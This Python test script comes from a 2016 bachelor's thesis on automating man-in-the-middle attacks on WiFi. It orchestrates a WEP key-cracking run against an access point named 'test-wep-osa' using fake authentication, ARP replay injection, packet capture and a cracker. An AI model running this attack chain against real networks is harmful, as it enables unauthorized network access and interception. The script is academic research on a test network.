#!/usr/bin/env python3
"""
sandbox file for testing available functionality

Automatization of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""

import sys

from model import *
from wep import *

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'


def main():
    logging.basicConfig(format='[%(asctime)s] %(funcName)s: %(message)s', level=logging.DEBUG)

    with tempfile.TemporaryDirectory(prefix='test-wep-osa-') as tmp_dirname:
        if_mon = 'wlp0s20u1u1mon'
        if_mon_mac = '00:36:76:54:b2:95'
        scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=if_mon)
        scan = scanner.scan_once()

        for ap in scan:
            if ap.essid == 'test-wep-osa':
                logging.info('scan found test-wep-osa')

                capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=if_mon)
                capturer.start(ap)

                fake_authentication = FakeAuthentication(interface=if_mon, ap=ap, attacker_mac=if_mon_mac)
                fake_authentication.start()

                arp_replay = ArpReplay(interface=if_mon, ap=ap, attacker_mac=if_mon_mac)
                arp_replay.start()

                # some time to create capturecapturer.capturing_cap_path
                while not capturer.has_capture_csv():
                    logging.debug('WirelessCapturer polling result')
                    time.sleep(1)

                cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=ap)
                cracker.start()

                iv = capturer.get_iv_sum()

                while not cracker.has_key():
                    time.sleep(5)
                    iv_curr = capturer.get_iv_sum()
                    if iv != iv_curr:
                        iv = iv_curr
                        logging.info('#IV = ' + str(iv))

                capturer.stop()
                arp_replay.stop()
                fake_authentication.stop()

    return 0


if __name__ == '__main__':
    status = main()
    sys.exit(status)
